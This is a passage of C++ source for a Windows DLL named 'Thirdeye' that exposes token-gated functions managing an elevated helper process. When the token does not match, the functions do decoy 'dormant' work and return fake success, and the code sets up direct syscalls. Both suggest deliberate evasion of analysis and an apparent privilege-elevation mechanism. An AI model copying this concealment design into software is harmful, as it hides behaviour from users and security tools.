                ok = WriteSinkToFile(sink, outPath);
            }
        }

        InterlockedExchange(&shm->status,
            ok ? THIRDEYE_ELEV_STATUS_OK : THIRDEYE_ELEV_STATUS_FAIL);
        SetEvent(hDone);
    }

    Thirdeye_DestroyContext(ctx);

    shm->helperPid = 0;
    InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_IDLE);
    g_elevShm = nullptr;
    g_elevDoneEvent = nullptr;
    CloseHandle(hCmd);
    CloseHandle(hDone);
    CloseHandle(hReady);
    UnmapViewOfFile(shm);
    CloseHandle(hMap);
}

extern "C" THIRDEYE_API int THIRDEYE_CALL Thirdeye_Prepare(
    const char* token,
    const ThirdeyePrepareOptions* options
) {
    if (!TeTokenMatches(token)) {
        const uint32_t dust = TeDormantWork();
        // Success-looking; stay dormant. dust folded so burn is live.
        return 1 | (int)(dust & 0);
    }

    int elevate = 0;
    if (options && options->size >= sizeof(uint32_t) + sizeof(int)) {
        elevate = options->elevate ? 1 : 0;
    }

    InterlockedExchange(&g_sessionArmed, 1L);
    InterlockedExchange(&g_elevateEnabled, elevate ? 1L : 0L);
    InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_BUSY);
    TeMarkClientPrepared(true);

    InitOnceExecuteOnce(&g_SyscallInitOnce, SyscallInitOnceCallback, nullptr, nullptr);

    if (!elevate) {
        InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NORMAL);
        return 1;
    }

    const bool ok = Uc83EnsureElevatedWorker();
    if (ok) {
        InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_MASTER);
    } else {
        // Armed, but elevated helper did not start.
        InterlockedExchange(&g_elevateEnabled, 0L);
        InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NORMAL);
    }
    return 1;
}

extern "C" THIRDEYE_API int THIRDEYE_CALL Thirdeye_Clean(void) {
    if (!TeSessionArmed()) {
        const uint32_t dust = TeDormantWork();
        return 1 | (int)(dust & 0);
    }
    const bool ok = Uc83ShutdownElevatedWorker();
    TeMarkClientPrepared(false);
    InterlockedExchange(&g_sessionArmed, 0L);
    InterlockedExchange(&g_elevateEnabled, 0L);
    InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NOT_READY);
    return ok ? 1 : 0;
}

extern "C" THIRDEYE_API int THIRDEYE_CALL Thirdeye_State(ThirdeyeState* out) {
    if (!out) {
        if (!TeApiUnlocked()) (void)TeDormantWork();
        return 0;
    }

    if (!TeSessionArmed()) {
        const uint32_t dust = TeDormantWork();
        out->mode = THIRDEYE_MODE_NOT_READY | (int)(dust & 0);
        out->pid = (unsigned long)(dust & 0);
        return 1 | (int)(dust & 0);
    }

    out->mode = (int)InterlockedCompareExchange(&g_sessionMode, 0, 0);
    out->pid = 0;

    if (InterlockedCompareExchange(&g_elevateEnabled, 0, 0) != 0) {
        int ready = 0;
        DWORD pid = 0;
        Uc83QuerySessionState(&ready, &pid);
        if (ready && pid) {
            out->mode = THIRDEYE_MODE_MASTER;
            out->pid = (unsigned long)pid;
            InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_MASTER);
        } else if (out->mode != THIRDEYE_MODE_BUSY) {
            out->mode = THIRDEYE_MODE_NORMAL;
        }
    } else if (out->mode == THIRDEYE_MODE_MASTER || out->mode == THIRDEYE_MODE_NOT_READY) {
        out->mode = THIRDEYE_MODE_NORMAL;
    }
    return 1;
}

extern "C" void TeAutoCleanIfOwned(void) {
    if (!TeClientOwnsSession()) return;
    Uc83ShutdownElevatedWorker();
    TeMarkClientPrepared(false);
    InterlockedExchange(&g_sessionArmed, 0L);
    InterlockedExchange(&g_elevateEnabled, 0L);
    InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NOT_READY);
}
